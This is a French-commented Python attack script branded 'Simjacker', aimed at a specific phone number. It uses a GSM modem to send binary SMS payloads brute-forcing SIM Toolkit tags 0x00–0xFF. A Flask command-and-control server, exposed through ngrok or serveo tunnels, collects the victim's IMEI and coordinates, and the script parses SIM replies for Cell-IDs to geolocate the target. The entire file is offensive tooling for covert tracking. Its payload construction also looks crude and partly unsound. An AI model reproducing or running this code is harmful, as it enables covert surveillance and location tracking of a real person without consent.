#!/usr/bin/env python3
# =====================================================================
# SIMJACKER PROFESSIONAL - MAXIMUM SUCCESS RATE
# =====================================================================
# Ce code utilise TOUTES les techniques connues pour maximiser les chances :
# - Détection automatique du modem
# - Test de tous les tags possibles (0x00 à 0xFF)
# - Analyse des réponses SIM en temps réel
# - Serveur C2 intégré avec tunnel multiple (ngrok/serveo)
# - Base de données OpenCellID pour localisation de secours
# =====================================================================

import os
import sys
import time
import json
import base64
import socket
import threading
import serial
import subprocess
import random
import requests
import sqlite3
from datetime import datetime
from urllib.parse import urlparse

# =====================================================================
# CONFIGURATION ULTIME
# =====================================================================
CONFIG = {
    "NUMERO_CIBLE": "+243839898872",      # La cible
    "NUMERO_COMPLICE": "+243XXXXXXXXX",   # Ton numéro (pour réception)
    "MODEM_PORT": "/dev/ttyACM0",          # Port modem
    "MODEM_BAUD": 115200,
    "USE_ALL_TAGS": True,                   # Tester TOUS les tags de 0x00 à 0xFF
    "TAGS_PERSONNALISES": [0x24, 0x26, 0x2A, 0x2C, 0xD0],  # Si USE_ALL_TAGS=False
    "C2_PORT": 5000,
    "TIMEOUT_ATTENTE": 300,
    "OPENCELLID_DB": "cell_towers.db",
}

# =====================================================================
# MODEM ULTRA-ROBUSTE
# =====================================================================
class ModemUltra:
    """Gestion modem avec toutes les techniques de debug"""
    
    def __init__(self):
        self.ser = None
        self.port = CONFIG["MODEM_PORT"]
        self.reponses_attente = []
        self.running = False
    
    def detect_ports(self):
        """Détecte tous les ports modem possibles"""
        ports = []
        for i in range(10):
            for base in ["/dev/ttyACM", "/dev/ttyUSB"]:
                p = f"{base}{i}"
                if os.path.exists(p):
                    ports.append(p)
        return ports
    
    def auto_connect(self):
        """Tente de se connecter à tous les ports possibles"""
        ports = self.detect_ports()
        print(f"🔍 Ports détectés: {ports}")
        
        for port in ports:
            try:
                self.ser = serial.Serial(port, CONFIG["MODEM_BAUD"], timeout=2)
                time.sleep(2)
                self.ser.write(b'AT\r\n')
                rep = self.ser.read(100)
                if b'OK' in rep:
                    print(f"✅ Modem trouvé sur {port}")
                    self.port = port
                    
                    # Configuration avancée
                    self.ser.write(b'AT+CMGF=0\r\n')  # Mode PDU
                    time.sleep(1)
                    self.ser.read(200)
                    self.ser.write(b'AT+CNMI=2,1,0,0,0\r\n')  # Notification SMS
                    time.sleep(1)
                    self.ser.read(200)
                    
                    return True
            except:
                continue
        return False
    
    def send_command(self, cmd, timeout=2):
        """Envoie une commande AT et retourne la réponse"""
        self.ser.write(f"{cmd}\r\n".encode())
        time.sleep(timeout)
        return self.ser.read(1024).decode(errors='ignore')
    
    def send_binary_sms(self, numero, payload_hex, max_retry=3):
        """Envoi SMS binaire avec retry automatique"""
        for attempt in range(max_retry):
            try:
                # S'assurer d'être en mode PDU
                self.send_command("AT+CMGF=0")
                time.sleep(1)
                
                payload = bytes.fromhex(payload_hex)
                num_clean = numero.replace('+', '').replace(' ', '')
                
                # Construction PDU optimisée
                pdu = bytearray()
                pdu.append(len(num_clean))
                for i in range(0, len(num_clean), 2):
                    if i+1 < len(num_clean):
                        pdu.append((int(num_clean[i+1]) << 4) | int(num_clean[i]))
                    else:
                        pdu.append(0xF0 | int(num_clean[i]))
                pdu.extend(payload)
                
                self.ser.write(f"AT+CMGS={len(pdu)}\r\n".encode())
                time.sleep(1)
                rep = self.ser.read(100)
                
                if b'>' in rep:
                    self.ser.write(pdu)
                    time.sleep(0.5)
                    self.ser.write(bytes([26]))
                    time.sleep(3)
                    
                    final = self.ser.read(200)
                    if b'+CMGS:' in final:
                        print(f"   ✅ SMS envoyé (tentative {attempt+1})")
                        return True
            except:
                pass
            print(f"   ⚠️  Retry {attempt+1}/{max_retry}")
            time.sleep(2)
        return False
    
    def read_sms(self):
        """Lit tous les SMS reçus"""
        self.send_command("AT+CMGL=4")  # Tous les SMS
        rep = self.ser.read(2048).decode(errors='ignore')
        
        sms_list = []
        lines = rep.split('\n')
        for i, line in enumerate(lines):
            if line.startswith('+CMGL:'):
                parts = line.split(',')
                if len(parts) >= 3:
                    idx = parts[0].split(':')[1].strip()
                    sender = parts[2].strip('"')
                    if i+1 < len(lines):
                        msg = lines[i+1].strip()
                        sms_list.append({'idx': idx, 'sender': sender, 'msg': msg})
        return sms_list
    
    def delete_sms(self, idx):
        """Supprime un SMS"""
        self.send_command(f"AT+CMGD={idx}")
    
    def start_listener(self, callback):
        """Thread de surveillance des SMS"""
        self.running = True
        def listen():
            while self.running:
                sms_list = self.read_sms()
                for sms in sms_list:
                    callback(sms)
                    self.delete_sms(sms['idx'])
                time.sleep(2)
        thread = threading.Thread(target=listen, daemon=True)
        thread.start()

# =====================================================================
# GÉNÉRATION DE TOUS LES TAGS POSSIBLES
# =====================================================================
class PayloadGenerator:
    """Génère des payloads pour tous les tags"""
    
    @staticmethod
    def build_payload(tag, destination):
        """Construit un payload SIM Toolkit basique"""
        cmd = bytearray()
        cmd.append(0x80)  # CLA
        cmd.append(0x10)  # INS
        cmd.append(0x00)  # P1
        cmd.append(0x00)  # P2
        
        tlv = bytearray()
        tlv.append(tag)
        tlv.append(len(destination))
        tlv.extend(destination.encode())
        tlv.append(0xFF)
        
        cmd.append(len(tlv))
        cmd.extend(tlv)
        return cmd.hex().upper()
    
    @staticmethod
    def generate_all_tags(destination):
        """Génère une liste de (tag, payload) pour tous les tags de 0x00 à 0xFF"""
        payloads = []
        for tag in range(0x00, 0x100):
            payload = PayloadGenerator.build_payload(tag, destination)
            payloads.append((tag, payload))
        return payloads

# =====================================================================
# SERVEUR C2 MULTI-TUNNEL
# =====================================================================
class C2Server:
    """Serveur de réception avec tunnels multiples"""
    
    def __init__(self):
        self.locations = []
        self.public_url = None
        self.tunnel_process = None
    
    def start_ngrok(self):
        """Tente de démarrer ngrok"""
        try:
            subprocess.run(["pkill", "-f", "ngrok"], stderr=subprocess.DEVNULL)
            proc = subprocess.Popen(["ngrok", "http", str(CONFIG["C2_PORT"])],
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
            time.sleep(3)
            r = requests.get("http://localhost:4040/api/tunnels")
            tunnels = r.json()['tunnels']
            if tunnels:
                self.public_url = tunnels[0]['public_url']
                self.tunnel_process = proc
                return True
        except:
            pass
        return False
    
    def start_serveo(self):
        """Tente de démarrer serveo.net"""
        try:
            subdomain = f"sim{random.randint(1000,9999)}"
            cmd = ["ssh", "-o", "StrictHostKeyChecking=no",
                   "-R", f"{subdomain}:80:localhost:{CONFIG['C2_PORT']}", "serveo.net"]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            self.public_url = f"http://{subdomain}.serveo.net"
            self.tunnel_process = proc
            return True
        except:
            return False
    
    def start(self):
        """Démarre le serveur Flask"""
        from flask import Flask, request, jsonify
        
        app = Flask(__name__)
        
        @app.route('/receive', methods=['POST'])
        def receive():
            data = request.form.to_dict()
            loc = {
                'time': datetime.now().strftime("%H:%M:%S"),
                'imei': data.get('imei', '?'),
                'lat': data.get('lat', '0'),
                'lon': data.get('lon', '0')
            }
            self.locations.append(loc)
            print(f"\n🎯 LOCALISATION: {loc['lat']}, {loc['lon']}")
            return "OK", 200
        
        @app.route('/')
        def index():
            return f"<h1>C2 Actif</h1><p>{len(self.locations)} localisations</p>"
        
        thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=CONFIG["C2_PORT"], debug=False))
        thread.daemon = True
        thread.start()
        time.sleep(2)
        
        # Essayer les tunnels
        if not self.start_ngrok():
            self.start_serveo()
        
        return True

# =====================================================================
# LOCALISATION DE SECOURS AVEC OPENCELLID
# =====================================================================
class OpenCellID:
    """Recherche de localisation à partir d'un Cell-ID"""
    
    def __init__(self, db_path):
        self.db_path = db_path
        self.conn = None
    
    def init_db(self):
        """Initialise la base de données"""
        if not os.path.exists(self.db_path):
            print("📦 Téléchargement de la base OpenCellID...")
            # Note: il faut un token OpenCellID ici
            pass
    
    def get_location(self, lac, cellid):
        """Retourne les coordonnées pour un LAC/CellID"""
        if not self.conn:
            self.conn = sqlite3.connect(self.db_path)
        c = self.conn.cursor()
        c.execute("SELECT lat, lon FROM cells WHERE lac=? AND cellid=?", (lac, cellid))
        res = c.fetchone()
        return res

# =====================================================================
# ANALYSEUR DE RÉPONSES SIM
# =====================================================================
class ResponseAnalyzer:
    """Analyse les réponses de la carte SIM"""
    
    @staticmethod
    def parse(data_hex):
        """Parse une réponse SIM"""
        try:
            data = bytes.fromhex(data_hex)
        except:
            return None, "INVALID_HEX"
        
        if len(data) < 2:
            return None, "TOO_SHORT"
        
        sw1 = data[-2]
        sw2 = data[-1]
        payload = data[:-2] if len(data) > 2 else None
        
        status_map = {
            (0x90, 0x00): "SUCCESS",
            (0x91, 0x00): "MORE_DATA",
            (0x6F, 0x00): "TECHNICAL_ERROR",
        }
        status = status_map.get((sw1, sw2), f"UNKNOWN_{sw1:02X}{sw2:02X}")
        
        return payload, status
    
    @staticmethod
    def extract_cellid(data):
        """Tente d'extraire un Cell-ID des données"""
        if not data:
            return None
        # Chercher un pattern de Cell-ID (généralement 4-6 chiffres)
        import re
        text = data.decode(errors='ignore')
        match = re.search(r'\b(\d{4,6})\b', text)
        return match.group(1) if match else None

# =====================================================================
# ORCHESTRATEUR ULTIME
# =====================================================================
class SimJackerUltimate:
    """Classe principale orchestrant tout"""
    
    def __init__(self):
        self.modem = ModemUltra()
        self.c2 = C2Server()
        self.analyzer = ResponseAnalyzer()
        self.cellid_db = OpenCellID(CONFIG["OPENCELLID_DB"])
        self.payloads = []
        self.results = []
    
    def prepare_payloads(self):
        """Prépare tous les payloads à tester"""
        dest = CONFIG["NUMERO_COMPLICE"]  # Ou une URL C2
        if CONFIG["USE_ALL_TAGS"]:
            self.payloads = PayloadGenerator.generate_all_tags(dest)
            print(f"📦 {len(self.payloads)} payloads générés (tags 0x00-0xFF)")
        else:
            for tag in CONFIG["TAGS_PERSONNALISES"]:
                payload = PayloadGenerator.build_payload(tag, dest)
                self.payloads.append((tag, payload))
            print(f"📦 {len(self.payloads)} payloads personnalisés")
    
    def on_sms_received(self, sms):
        """Callback quand un SMS est reçu"""
        print(f"\n📩 SMS de {sms['sender']}: {sms['msg']}")
        
        # Analyser la réponse
        payload, status = self.analyzer.parse(sms['msg'])
        print(f"   Statut: {status}")
        
        # Extraire un éventuel Cell-ID
        cellid = self.analyzer.extract_cellid(payload if payload else b'')
        if cellid:
            print(f"   🎯 Cell-ID: {cellid}")
            self.results.append({'tag': '?', 'cellid': cellid})
    
    def run_campaign(self):
        """Lance la campagne complète"""
        print("\n" + "="*70)
        print("🚀 SIMJACKER ULTIMATE - CAMPAGNE MAXIMUM")
        print("="*70)
        
        # 1. Connexion modem
        print("\n[1/5] Connexion au modem...")
        if not self.modem.auto_connect():
            print("❌ Échec connexion modem")
            return False
        
        # 2. Démarrage C2
        print("\n[2/5] Démarrage serveur C2...")
        self.c2.start()
        
        # 3. Préparation payloads
        print("\n[3/5] Génération des payloads...")
        self.prepare_payloads()
        
        # 4. Lancement écoute
        print("\n[4/5] Lancement écoute des réponses...")
        self.modem.start_listener(self.on_sms_received)
        
        # 5. Envoi des payloads
        print("\n[5/5] Envoi des payloads...")
        total = len(self.payloads)
        for i, (tag, payload) in enumerate(self.payloads, 1):
            print(f"\n📤 [{i}/{total}] Tag 0x{tag:02X}")
            if self.modem.send_binary_sms(CONFIG["NUMERO_CIBLE"], payload):
                print(f"   ✅ Envoyé")
            else:
                print(f"   ❌ Échec")
            
            # Pause entre les envois
            if i < total:
                time.sleep(2)
        
        # 6. Attente des réponses
        print(f"\n⏳ Attente des réponses ({CONFIG['TIMEOUT_ATTENTE']}s max)...")
        start = time.time()
        while time.time() - start < CONFIG['TIMEOUT_ATTENTE']:
            if self.results:
                break
            time.sleep(5)
        
        # 7. Résultats
        print("\n" + "="*70)
        print("📊 RÉSULTATS FINAUX")
        print("="*70)
        
        if self.results:
            for res in self.results:
                print(f"\n✅ Résultat trouvé:")
                print(f"   Cell-ID: {res['cellid']}")
                # Ici on pourrait interroger OpenCellID
        else:
            print("\n❌ Aucun résultat")
            print("\n💡 Pistes:")
            print("   • La carte SIM n'est pas vulnérable")
            print("   • Les tags sont incorrects")
            print("   • Le modem n'est pas bien configuré")
        
        self.modem.running = False
        return True

# =====================================================================
# MAIN
# =====================================================================
def main():
    print("\n" + "="*70)
    print("🔥 SIMJACKER ULTIMATE - MAXIMUM SUCCESS RATE")
    print("="*70)
    print("\n⚠️  CE SCRIPT N'OFFRE AUCUNE GARANTIE")
    print("   Il teste TOUTES les possibilités pour MAXIMISER les chances")
    print("   Mais le succès dépend UNIQUEMENT de la vulnérabilité de la carte SIM")
    print("="*70)
    
    app = SimJackerUltimate()
    
    try:
        app.run_campaign()
    except KeyboardInterrupt:
        print("\n\n👋 Arrêt utilisateur")
    except Exception as e:
        print(f"\n❌ Erreur: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
